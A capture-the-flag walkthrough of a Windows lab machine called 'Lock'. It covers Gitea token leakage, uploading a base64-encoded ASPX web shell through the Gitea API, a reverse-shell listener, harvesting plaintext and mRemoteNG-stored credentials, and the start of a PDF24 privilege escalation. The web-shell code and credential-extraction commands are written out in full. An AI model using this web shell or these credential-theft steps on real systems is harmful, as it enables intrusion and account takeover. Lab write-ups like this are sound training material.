
## Lab Details
- Difficulty: Easy
- OS: Windows 

## Summary
- Initial access: Web App
- Privilege escalation: CVE-2023-49147

## Enumeration
#### Steps
- run `nmap`
```
$nmap 10.129.234.64 -p80,445,3389,3000 -sC -sV -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-03 22:36 EDT
Nmap scan report for 10.129.234.64
Host is up (0.20s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Lock - Index
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=63c1cb18e35b7817; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=51ZeZYJe1DGeY_YIflkq_oJRf_46MTc4MzEzMjYwMDE1MDg1MDgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 04 Jul 2026 02:36:40 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=65bbbb69ca26dcb7; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=iJi0b57lqkgmg8d3xNjw-lLJj506MTc4MzEzMjYwMTAxNTk3NDMwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 04 Jul 2026 02:36:41 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2026-07-03T01:27:33
|_Not valid after:  2027-01-02T01:27:33
|_ssl-date: 2026-07-04T02:37:45+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-04T02:37:05+00:00
```
## Foothold

#### Steps
- From nmap the result shows that port 3000 is hosting Gitea
- Visit port 3000, we are able to enumerate projects anonymously 
![[Pasted image 20260704124118.png]]
- A project named `dev-scripts` can be found
![[Pasted image 20260704124134.png]]
- Enumerate the past commits found a old version thats containing an access token
![[Pasted image 20260704104133.png]]
- Token extracted 
```
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f' 
```
- The script also shows an endpoint to the Gitea API
![[Pasted image 20260704110546.png]]
- Visit the API page
![[Pasted image 20260704110603.png]]
- Input the token 
![[Pasted image 20260704110630.png]]
- We are able to retrieve the repos under the user `ellen.freeman`
![[Pasted image 20260704110709.png]]
- Using `curl` we found another repo called website
```
$curl -X 'GET' \
               'http://10.129.234.64:3000/api/v1/repos/ellen.freeman/website?access_token=43ce39bb
0bd6bc489284f2905f033ca467a6362f' \
               -H 'accept: application/json' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2054    0  2054    0     0   6498      0 --:--:-- --:--:-- --:--:--  6500
{
  "id": 5,
  "owner": {
    "id": 2,
    "login": "ellen.freeman",
    "login_name": "",
    "full_name": "",
    "email": "ellen.freeman@lock.vl",
    "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
    "language": "",
    "is_admin": false,
    "last_login": "0001-01-01T00:00:00Z",
    "created": "2023-12-27T11:13:10-08:00",
    "restricted": false,
    "active": false,
    "prohibit_login": false,
    "location": "",
    "website": "",
    "description": "",
    "visibility": "public",
    "followers_count": 0,
    "following_count": 0,
    "starred_repos_count": 0,
    "username": "ellen.freeman"
  },
  "name": "website",
  "full_name": "ellen.freeman/website",
  "description": "",
  "empty": false,
  "private": true,
  "fork": false,
  "template": false,
  "parent": null,
  "mirror": false,
  "size": 7370,
  "language": "CSS",
  "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/languages",
  "html_url": "http://localhost:3000/ellen.freeman/website",
  "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website",
  "link": "",
  "ssh_url": "ellen.freeman@localhost:ellen.freeman/website.git",
  "clone_url": "http://localhost:3000/ellen.freeman/website.git",
  "original_url": "",
  "website": "",
  "stars_count": 0,
  "forks_count": 0,
  "watchers_count": 1,
  "open_issues_count": 0,
  "open_pr_counter": 0,
  "release_counter": 0,
  "default_branch": "main",
  "archived": false,
  "created_at": "2023-12-27T12:04:52-08:00",
  "updated_at": "2024-01-18T10:17:46-08:00",
  "archived_at": "1969-12-31T16:00:00-08:00",
  "permissions": {
    "admin": true,
    "push": true,
    "pull": true
  },
  "has_issues": true,
  "internal_tracker": {
    "enable_time_tracker": true,
    "allow_only_contributors_to_track_time": true,
    "enable_issue_dependencies": true
  },
  "has_wiki": true,
  "has_pull_requests": true,
  "has_projects": true,
  "has_releases": true,
  "has_packages": true,
  "has_actions": false,
  "ignore_whitespace_conflicts": false,
  "allow_merge_commits": true,
  "allow_rebase": true,
  "allow_rebase_explicit": true,
  "allow_squash_merge": true,
  "allow_rebase_update": true,
  "default_delete_branch_after_merge": false,
  "default_merge_style": "merge",
  "default_allow_maintainer_edit": false,
  "avatar_url": "",
  "internal": false,
  "mirror_interval": "",
  "mirror_updated": "0001-01-01T00:00:00Z",
  "repo_transfer": null
}
```
- Download the website repo on API website 
![[Pasted image 20260704105703.png]]
- We found the source code on port 80
```
$tree
.
├── gitea.py
├── website
│   ├── assets
│   │   ├── css
│   │   │   └── style.css
│   │   ├── img
│   │   │   ├── about.jpg
│   │   │   ├── apple-touch-icon.png
│   │   │   ├── clients
│   │   │   │   ├── client-1.png
│   │   │   │   ├── client-2.png
│   │   │   │   ├── client-3.png
│   │   │   │   ├── client-4.png
│   │   │   │   ├── client-5.png
│   │   │   │   ├── client-6.png
│   │   │   │   ├── client-7.png
│   │   │   │   └── client-8.png
│   │   │   ├── counts-img.jpg
│   │   │   ├── cta-bg.jpg
│   │   │   ├── favicon.png
│   │   │   ├── features.jpg
│   │   │   ├── hero-bg.jpg
│   │   │   ├── portfolio
```
- There is an API for adding a file, searching online and found an example update the example with target info including the token
- Post it using `curl`, we get an response 
```
$curl -X POST "http://10.129.234.64:3000/api/v1/repos/ellen.freeman/website/contents/hello
.txt?access_token=43ce39bb0bd6bc489284f2905f033ca467a6362f" \
               -H "accept: application/json" \
               -H "Authorization: 43ce39bb0bd6bc489284f2905f033ca467a6362f" \
               -H "Content-Type: application/json" \
               -d '{
             "content": "SGVsbG8gV29ybGQh",
             "message": "Add hello.md via API",
             "branch": "main"
           }'

{"content":{"name":"hello.txt","path":"hello.txt","sha":"c57eff55ebc0c54973903af5f72bac72762cf4f4","last_commit_sha":"8e7c8035cbc27a48244da105fa682e3532f4372f","type":"file","size":12,"encoding":"base64","content":"SGVsbG8gV29ybGQh","target":null,"url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/hello.txt?ref=main","html_url":"http://localhost:3000/ellen.freeman/website/src/branch/main/hello.txt","git_url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/c57eff55ebc0c54973903af5f72bac72762cf4f4","download_url":"http://localhost:3000/ellen.freeman/website/raw/branch/main/hello.txt","submodule_git_url":null,"_links":{"self":"http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/hello.txt?ref=main","git":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/c57eff55ebc0c54973903af5f72bac72762cf4f4","html":"http://localhost:3000/ellen.freeman/website/src/branch/main/hello.txt"}},"commit":{"url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/commits/8e7c8035cbc27a48244da105fa682e3532f4372f","sha":"8e7c8035cbc27a48244da105fa682e3532f4372f","created":"0001-01-01T00:00:00Z","html_url":"http://localhost:3000/ellen.freeman/website/commit/8e7c8035cbc27a48244da105fa682e3532f4372f","author":{"name":"ellen.freeman","email":"ellen.freeman@lock.vl","date":"2026-07-04T03:04:25Z"},"committer":{"name":"ellen.freeman","email":"ellen.freeman@lock.vl","date":"2026-07-04T03:04:25Z"},"parents":[{"url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/commits/73cdcc185726ea3ae5687a04a3c97fab1ae1714a","sha":"73cdcc185726ea3ae5687a04a3c97fab1ae1714a","created":"0001-01-01T00:00:00Z"}],"message":"Add hello.md via API\n","tree":{"url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/trees/86a694f3470cbf6708ebf44f55e863d9c5d4963a","sha":"86a694f3470cbf6708ebf44f55e863d9c5d4963a","created":"0001-01-01T00:00:00Z"}},"verification":{"verified":false,"reason":"gpg.error.not_signed_commit","signature":"","signer":null,"payload":""}}
```
- Verify if the file has been created
![[Pasted image 20260704110448.png]]
- Confirm that we can access the newly created file, we can also upload a webshell 
- Tested with PHP, the web server is unable to host it however aspx does work
- Found a aspx web shell https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx,  convert it using `cyberchef`
- Update the content field and POST the request 
```
$curl -X POST "http://10.129.234.64:3000/api/v1/repos/ellen.freeman/website/contents/webshell.aspx?access_token=43ce39
bb0bd6bc489284f2905f033ca467a6362f" \
               -H "accept: application/json" \
               -H "Authorization: token your_token_here" \
               -H "Content-Type: application/json" \
               -d '{
             "content": "PCVAIFBhZ2UgTGFuZ3VhZ2U9IlZCIiBEZWJ1Zz0idHJ1ZSIgJT4NCjwlQCBpbXBvcnQgTmFtZXNwYWNlPSJzeXN0ZW0uSU8iICU+D
Qo8JUAgaW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpYWdub3N0aWNzIiAlPg0KDQo8c2NyaXB0IHJ1bmF0PSJzZXJ2ZXIiPiAgICAgIA0KDQpTdWIgUnVuQ21kKFN
yYyBBcyBPYmplY3QsIEUgQXMgRXZlbnRBcmdzKSAgICAgICAgICAgIA0KICBEaW0gbXlQcm9jZXNzIEFzIE5ldyBQcm9jZXNzKCkgICAgICAgICAgICANCiAgRGltI
G15UHJvY2Vzc1N0YXJ0SW5mbyBBcyBOZXcgUHJvY2Vzc1N0YXJ0SW5mbyh4cGF0aC50ZXh0KSAgICAgICAgICAgIA0KICBteVByb2Nlc3NTdGFydEluZm8uVXNlU2h
lbGxFeGVjdXRlID0gZmFsc2UgICAgICAgICAgICANCiAgbXlQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlICAgICAgICAgICAgD
QogIG15UHJvY2Vzcy5TdGFydEluZm8gPSBteVByb2Nlc3NTdGFydEluZm8gICAgICAgICAgICANCiAgbXlQcm9jZXNzU3RhcnRJbmZvLkFyZ3VtZW50cz14Y21kLnR
leHQgICAgICAgICAgICANCiAgbXlQcm9jZXNzLlN0YXJ0KCkgICAgICAgICAgICANCg0KICBEaW0gbXlTdHJlYW1SZWFkZXIgQXMgU3RyZWFtUmVhZGVyID0gbXlQc
m9jZXNzLlN0YW5kYXJkT3V0cHV0ICAgICAgICAgICAgDQogIERpbSBteVN0cmluZyBBcyBTdHJpbmcgPSBteVN0cmVhbVJlYWRlci5SZWFkdG9lbmQoKSAgICAgICA
gICAgIA0KICBteVByb2Nlc3MuQ2xvc2UoKSAgICAgICAgICAgIA0KICBteXN0cmluZz1yZXBsYWNlKG15c3RyaW5nLCI8IiwiJmx0OyIpICAgICAgICAgICAgDQogI
G15c3RyaW5nPXJlcGxhY2UobXlzdHJpbmcsIj4iLCImZ3Q7IikgICAgICAgICAgICANCiAgcmVzdWx0LnRleHQ9IHZiY3JsZiAmICI8cHJlPiIgJiBteXN0cmluZyA
mICI8L3ByZT4iICAgIA0KRW5kIFN1Yg0KDQo8L3NjcmlwdD4NCg0KPGh0bWw+DQo8Ym9keT4gICAgDQo8Zm9ybSBydW5hdD0ic2VydmVyIj4gICAgICAgIA0KPHA+P
GFzcDpMYWJlbCBpZD0iTF9wIiBydW5hdD0ic2VydmVyIiB3aWR0aD0iODBweCI+UHJvZ3JhbTwvYXNwOkxhYmVsPiAgICAgICAgDQo8YXNwOlRleHRCb3ggaWQ9Inh
wYXRoIiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMzAwcHgiPmM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZTwvYXNwOlRleHRCb3g+ICAgICAgICANCjxwPjxhc3A6T
GFiZWwgaWQ9IkxfYSIgcnVuYXQ9InNlcnZlciIgd2lkdGg9IjgwcHgiPkFyZ3VtZW50czwvYXNwOkxhYmVsPiAgICAgICAgDQo8YXNwOlRleHRCb3ggaWQ9InhjbWQ
iIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSIzMDBweCIgVGV4dD0iL2MgbmV0IHVzZXIiPi9jIG5ldCB1c2VyPC9hc3A6VGV4dEJveD4gICAgICAgIA0KPHA+PGFzcDpCd
XR0b24gaWQ9IkJ1dHRvbiIgb25jbGljaz0icnVuY21kIiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMTAwcHgiIFRleHQ9IlJ1biI+PC9hc3A6QnV0dG9uPiAgICAgICA
gDQo8cD48YXNwOkxhYmVsIGlkPSJyZXN1bHQiIHJ1bmF0PSJzZXJ2ZXIiPjwvYXNwOkxhYmVsPiAgICAgICANCjwvZm9ybT4NCjwvYm9keT4NCjwvaHRtbD4=",
             "message": "Add web shell via API",
             "branch": "main"
           }'
{"content":{"name":"webshell.aspx","path":"webshell.aspx","sha":"3a3432344c1d60e8cbb44f0dcf72bfd612a9edf3","last_commit_sha":"f091969ec267eb1b0c234ff0363a20b7720d2931","type":"file","size":1583,"encoding":"base64","content":"PCVAIFBhZ2UgTGFuZ3VhZ2U9IlZCIiBEZWJ1Zz0idHJ1ZSIgJT4NCjwlQCBpbXBvcnQgTmFtZXNwYWNlPSJzeXN0ZW0uSU8iICU+DQo8JUAgaW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpYWdub3N0aWNzIiAlPg0KDQo8c2NyaXB0IHJ1bmF0PSJzZXJ2ZXIiPiAgICAgIA0KDQpTdWIgUnVuQ21kKFNyYyBBcyBPYmplY3QsIEUgQXMgRXZlbnRBcmdzKSAgICAgICAgICAgIA0KICBEaW0gbXlQcm9jZXNzIEFzIE5ldyBQcm9jZXNzKCkgICAgICAgICAgICANCiAgRGltIG15UHJvY2Vzc1N0YXJ0SW5mbyBBcyBOZXcgUHJvY2Vzc1N0YXJ0SW5mbyh4cGF0aC50ZXh0KSAgICAgICAgICAgIA0KICBteVByb2Nlc3NTdGFydEluZm8uVXNlU2hlbGxFeGVjdXRlID0gZmFsc2UgICAgICAgICAgICANCiAgbXlQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlICAgICAgICAgICAgDQogIG15UHJvY2Vzcy5TdGFydEluZm8gPSBteVByb2Nlc3NTdGFydEluZm8gICAgICAgICAgICANCiAgbXlQcm9jZXNzU3RhcnRJbmZvLkFyZ3VtZW50cz14Y21kLnRleHQgICAgICAgICAgICANCiAgbXlQcm9jZXNzLlN0YXJ0KCkgICAgICAgICAgICANCg0KICBEaW0gbXlTdHJlYW1SZWFkZXIgQXMgU3RyZWFtUmVhZGVyID0gbXlQcm9jZXNzLlN0YW5kYXJkT3V0cHV0ICAgICAgICAgICAgDQogIERpbSBteVN0cmluZyBBcyBTdHJpbmcgPSBteVN0cmVhbVJlYWRlci5SZWFkdG9lbmQoKSAgICAgICAgICAgIA0KICBteVByb2Nlc3MuQ2xvc2UoKSAgICAgICAgICAgIA0KICBteXN0cmluZz1yZXBsYWNlKG15c3RyaW5nLCI8IiwiJmx0OyIpICAgICAgICAgICAgDQogIG15c3RyaW5nPXJlcGxhY2UobXlzdHJpbmcsIj4iLCImZ3Q7IikgICAgICAgICAgICANCiAgcmVzdWx0LnRleHQ9IHZiY3JsZiAmICI8cHJlPiIgJiBteXN0cmluZyAmICI8L3ByZT4iICAgIA0KRW5kIFN1Yg0KDQo8L3NjcmlwdD4NCg0KPGh0bWw+DQo8Ym9keT4gICAgDQo8Zm9ybSBydW5hdD0ic2VydmVyIj4gICAgICAgIA0KPHA+PGFzcDpMYWJlbCBpZD0iTF9wIiBydW5hdD0ic2VydmVyIiB3aWR0aD0iODBweCI+UHJvZ3JhbTwvYXNwOkxhYmVsPiAgICAgICAgDQo8YXNwOlRleHRCb3ggaWQ9InhwYXRoIiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMzAwcHgiPmM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZTwvYXNwOlRleHRCb3g+ICAgICAgICANCjxwPjxhc3A6TGFiZWwgaWQ9IkxfYSIgcnVuYXQ9InNlcnZlciIgd2lkdGg9IjgwcHgiPkFyZ3VtZW50czwvYXNwOkxhYmVsPiAgICAgICAgDQo8YXNwOlRleHRCb3ggaWQ9InhjbWQiIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSIzMDBweCIgVGV4dD0iL2MgbmV0IHVzZXIiPi9jIG5ldCB1c2VyPC9hc3A6VGV4dEJveD4gICAgICAgIA0KPHA+PGFzcDpCdXR0b24gaWQ9IkJ1dHRvbiIgb25jbGljaz0icnVuY21kIiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMTAwcHgiIFRleHQ9IlJ1biI+PC9hc3A6QnV0dG9uPiAgICAgICAgDQo8cD48YXNwOkxhYmVsIGlkPSJyZXN1bHQiIHJ1bmF0PSJzZXJ2ZXIiPjwvYXNwOkxhYmVsPiAgICAgICANCjwvZm9ybT4NCjwvYm9keT4NCjwvaHRtbD4=","target":null,"url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/webshell.aspx?ref=main","html_url":"http://localhost:3000/ellen.freeman/website/src/branch/main/webshell.aspx","git_url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/3a3432344c1d60e8cbb44f0dcf72bfd612a9edf3","download_url":"http://localhost:3000/ellen.freeman/website/raw/branch/main/webshell.aspx","submodule_git_url":null,"_links":{"self":"http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/webshell.aspx?ref=main","git":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/3a3432344c1d60e8cbb44f0dcf72bfd612a9edf3","html":"http://localhost:3000/ellen.freeman/website/src/branch/main/webshell.aspx"}},"commit":{"url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/commits/f091969ec267eb1b0c234ff0363a20b7720d2931","sha":"f091969ec267eb1b0c234ff0363a20b7720d2931","created":"0001-01-01T00:00:00Z","html_url":"http://localhost:3000/ellen.freeman/website/commit/f091969ec267eb1b0c234ff0363a20b7720d2931","author":{"name":"ellen.freeman","email":"ellen.freeman@lock.vl","date":"2026-07-04T03:47:14Z"},"committer":{"name":"ellen.freeman","email":"ellen.freeman@lock.vl","date":"2026-07-04T03:47:14Z"},"parents":[{"url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/commits/b7e113537a0f8653c0d66f61d02d11dd38169821","sha":"b7e113537a0f8653c0d66f61d02d11dd38169821","created":"0001-01-01T00:00:00Z"}],"message":"Add web shell via API\n","tree":{"url":"http://localhost:3000/api/v1/repos/ellen.freeman/website/git/trees/31eeb7e4f0d07120ad28a4f0f71122c5a09dcef3","sha":"31eeb7e4f0d07120ad28a4f0f71122c5a09dcef3","created":"0001-01-01T00:00:00Z"}},"verification":{"verified":false,"reason":"gpg.error.not_signed_commit","signature":"","signer":null,"payload":""}}
```
- Verify the webshell and we can see the webshell
![[Pasted image 20260704114731.png]]
- Craft a reverse shell payload using https://www.revshells.com/
![[Pasted image 20260704114936.png]]
- Start a listener and execute the reverse shell payload
```
$nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.234.64 54459

PS C:\windows\system32\inetsrv> whoami
lock\ellen.freeman
```
## Lateral Movement 

#### Steps
- Enumerate `ellen.freeman` folder and found a password for `ellen.freeman`
```
PS C:\users\ellen.freeman> ls


    Directory: C:\users\ellen.freeman


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        12/27/2023  11:11 AM                .ssh
d-r---        12/28/2023   5:58 AM                3D Objects
d-r---        12/28/2023   5:58 AM                Contacts
d-r---        12/28/2023   6:11 AM                Desktop
d-r---        12/28/2023   5:59 AM                Documents
d-r---        12/28/2023   5:58 AM                Downloads
d-r---        12/28/2023   5:58 AM                Favorites
d-r---        12/28/2023   5:58 AM                Links
d-r---        12/28/2023   5:58 AM                Music
d-r---        12/28/2023   5:58 AM                Pictures
d-r---        12/28/2023   5:58 AM                Saved Games
d-r---        12/28/2023   5:58 AM                Searches
d-r---        12/28/2023   5:58 AM                Videos
-a----        12/28/2023  11:38 AM             52 .git-credentials
-a----        12/28/2023  11:35 AM            158 .gitconfig


PS C:\users\ellen.freeman> cat .git-credentials
http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000
```
- Enumerate the program files found `mRemoteNG` is installed
```
PS C:\Program Files (x86)> ls


    Directory: C:\Program Files (x86)


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:34 AM                Common Files
d-----         4/15/2025   5:56 PM                Internet Explorer
d-----        12/27/2023  10:26 AM                Microsoft
d-----          5/8/2021   1:34 AM                Microsoft.NET
d-----        12/28/2023  11:24 AM                Mozilla Maintenance Service
d-----        12/28/2023   5:39 AM                mRemoteNG
d-----          5/8/2021   2:35 AM                Windows Defender
d-----         4/15/2025   5:56 PM                Windows Mail
d-----         4/15/2025   5:56 PM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----         4/15/2025   5:56 PM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell

```
- mRemoteNG has a known vulnerability that allows attacker to extract the plaintext password from `confCons.xml`
```
PS C:\users\ellen.freeman\AppData\Roaming\mRemoteNG> ls


    Directory: C:\users\ellen.freeman\AppData\Roaming\mRemoteNG


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        12/28/2023   5:58 AM                Themes
-a----        12/28/2023   5:59 AM           3341 confCons.xml
-a----        12/28/2023   5:58 AM            340 confCons.xml.20231228-0558390956.backup
-a----        12/28/2023   5:58 AM           3242 confCons.xml.20231228-0558434222.backup
-a----        12/28/2023   5:58 AM           3236 confCons.xml.20231228-0558502242.backup
-a----        12/28/2023   5:58 AM           3249 confCons.xml.20231228-0558531392.backup
-a----        12/28/2023   5:58 AM           3253 confCons.xml.20231228-0558577172.backup
-a----        12/28/2023   5:58 AM           3341 confCons.xml.20231228-0559136449.backup
-a----        12/28/2023   5:59 AM           3341 confCons.xml.20231228-0559140364.backup
-a----        12/28/2023   5:59 AM           3341 confCons.xml.20231228-0559599708.backup
-a----        12/28/2023   5:59 AM             51 extApps.xml
-a----        12/28/2023   5:59 AM           2014 mRemoteNG.log
-a----        12/28/2023   5:59 AM           2246 pnlLayout.xml
```

```
PS C:\users\ellen.freeman\AppData\Roaming\mRemoteNG> cat confCons.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```
- Follow post https://hackersvanguard.com/mremoteng-insecure-password-storage/ to extract the plaintext password in detail
- The prerequisite requires a VM or a Windows machine that has mRemoteNG installed, download here https://github.com/mremoteng/mremoteng/releases
- First import the `.xml` file 
![[Pasted image 20260704120747.png]]
- Then create an external tool per below instruction
```
To see the clear text of a given password, go to “Tools” > “External Tools”. Then right-click in the white space and choose “New External Tool”. Next, in the External Tools Properties, fill in a “Display Name”, “Filename” and some “arguments”, with “Password lookup”, CMD and “/k echo %password%” respectively.
```
- Finally, go to the connection where you would like to reveal the connection and right-click on it and choose “External tools” > “Password lookup”.
![[Pasted image 20260704120948.png]]
- Test the password using `nxc`
```
$nxc smb 10.129.234.64 -u gale.dekarios -p 'ty8wnW9qCKDosXo6'
SMB         10.129.234.64   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:None)
SMB         10.129.234.64   445    LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosXo6
```
- Found the user `gale.dekarios` has RDP permission 
```
$nxc rdp 10.129.234.64 -u gale.dekarios -p 'ty8wnW9qCKDosXo6'
RDP         10.129.234.64   3389   LOCK             [*] Windows 10 or Windows Server 2016 Build 20348 (name:LOCK) (domain:Lock) (nla:False)
RDP         10.129.234.64   3389   LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosXo6 (Pwn3d!)
```
- Use `xfreerdp` to gain RDP access to target
```
xfreerdp /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /v:10.129.234.64
```
## Privilege Escalation

#### Steps
- On the desktop show PDF24 installed 
- Searching online found a post on PDF24 vulnerability for Windows LPE (CVE-2023-49147) https://seclists.org/fulldisclosure/2023/Dec/18
- First the post states that we will need `SetOpLock` program to set a oplock to `faxPrnInst.log` file
-  Download it here https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0
- Transfer to target by drag and drop 
![[Pasted image 20260704121710.png]]
- Run a search on the vulnerable msi package using powershell 
```
Get-ChildItem -Path "C:\" -Filter "*.msi" -Recurse -ErrorAction SilentlyContinue -Force
```
